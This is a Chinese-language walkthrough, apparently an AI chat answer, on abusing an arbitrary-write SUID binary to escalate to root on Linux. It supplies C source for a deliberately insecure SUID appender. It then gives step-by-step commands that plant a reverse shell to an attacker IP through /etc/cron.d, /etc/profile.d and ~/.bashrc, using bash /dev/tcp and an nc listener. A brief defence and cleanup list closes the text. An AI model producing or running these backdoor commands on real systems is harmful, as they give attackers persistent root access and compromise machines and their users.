@@ -1,0 +1,126 @@
+若 SUID 程序能写入 /etc/cron.d/、/etc/profile.d/、~/.bashrc 等文件，就可插入反弹 shell 或定时任务
+
+已思考 9 秒
+
+
+下面假设系统中存在一个功能简单的 SUID 程序 `suid_writer`，它能以 root 身份往任意路径“追加”一行文本：
+
+```c
+// suid_writer.c
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(int argc, char *argv[]) {
+    if (argc != 3) {
+        fprintf(stderr, "Usage: %s <file> <line>\n", argv[0]);
+        return 1;
+    }
+    FILE *f = fopen(argv[1], "a");
+    if (!f) { perror("fopen"); return 1; }
+    fprintf(f, "%s\n", argv[2]);
+    fclose(f);
+    return 0;
+}
+```
+
+编译并设置 SUID：
+
+```bash
+gcc suid_writer.c -o suid_writer
+sudo chown root:root suid_writer
+sudo chmod 4755 suid_writer
+```
+
+有了这个“任写”能力，就可以分别针对 `/etc/cron.d/`、`/etc/profile.d/` 和 `~/.bashrc` 三种场景做利用。
+
+---
+
+## 1. 利用 `/etc/cron.d/`：定时任务提权
+
+### 步骤
+
+1. **编写要写入的 cron 任务**
+   例如每分钟向攻击者主机反弹 shell（假设攻击者 IP 为 `192.0.2.123`, 监听端口 `4444`）：
+
+   ```
+   * * * * * root /bin/bash -i >& /dev/tcp/192.0.2.123/4444 0>&1
+   ```
+
+2. **用 SUID 程序写入 `/etc/cron.d/backdoor`**
+
+   ```bash
+   ./suid_writer /etc/cron.d/backdoor \
+     "* * * * * root /bin/bash -i >& /dev/tcp/192.0.2.123/4444 0>&1"
+   ```
+
+3. **确认文件权限**
+
+   ```bash
+   ls -l /etc/cron.d/backdoor
+   # -rw-r--r-- 1 root root … /etc/cron.d/backdoor
+   ```
+
+4. **等待或触发 cron**
+   Cron 守护进程一般每分钟读取一次 `/etc/cron.d/*`，到下个整分钟就会以 root 身份执行上述反弹命令，你的监听工具（如 `nc -lvp 4444`）即可接到 shell。
+
+---
+
+## 2. 利用 `/etc/profile.d/`：登录即提权
+
+### 步骤
+
+1. **编写 profile 脚本内容**
+   在所有用户登录时执行反弹 shell：
+
+   ```bash
+   /bin/bash -i >& /dev/tcp/192.0.2.123/4444 0>&1
+   ```
+
+2. **写入 `/etc/profile.d/backdoor.sh`**
+
+   ```bash
+   ./suid_writer /etc/profile.d/backdoor.sh \
+     "/bin/bash -i >& /dev/tcp/192.0.2.123/4444 0>&1"
+   ```
+
+3. **设置可执行权限**
+
+   ```bash
+   sudo chmod 755 /etc/profile.d/backdoor.sh
+   ```
+
+4. **触发**
+   下次任何用户通过登录 shell（SSH、console、su –）登录系统时，`/etc/profile.d/backdoor.sh` 会被自动 `source`，反弹 root shell。
+
+---
+
+## 3. 利用 `~/.bashrc`：当前用户提权
+
+> 注意：此方法只影响当前用户自己登录交互式 shell，不需要重启服务。
+
+### 步骤
+
+1. **在自己家目录的 `.bashrc` 末尾追加反弹命令**
+
+   ```bash
+   ./suid_writer ~/.bashrc \
+     "bash -i >& /dev/tcp/192.0.2.123/4444 0>&1"
+   ```
+2. **确认已追加**
+
+   ```bash
+   tail -n 3 ~/.bashrc
+   # … 之前的内容 …
+   bash -i >& /dev/tcp/192.0.2.123/4444 0>&1
+   ```
+3. **触发**
+   只需新开一个登录/交互式 shell（如 `ssh localhost` 或重新打开终端），反弹就会自动发生。
+
+---
+
+## 四、防御与清理
+
+1. **最小化 SUID**：避免提供“任写”类 SUID 程序。
+2. **审计关键目录**：定期检查 `/etc/cron.d/`、`/etc/profile.d/` 是否有可疑文件，及用户家目录下的 shell 配置。
+3. **使用文件完整性保护**：如 AIDE、Tripwire，监控关键文件的改动。
+4. **及时清理**：发现后删除 `/etc/cron.d/backdoor`、`/etc/profile.d/backdoor.sh`、`.bashrc` 中恶意行，并重启相应服务或注销用户。
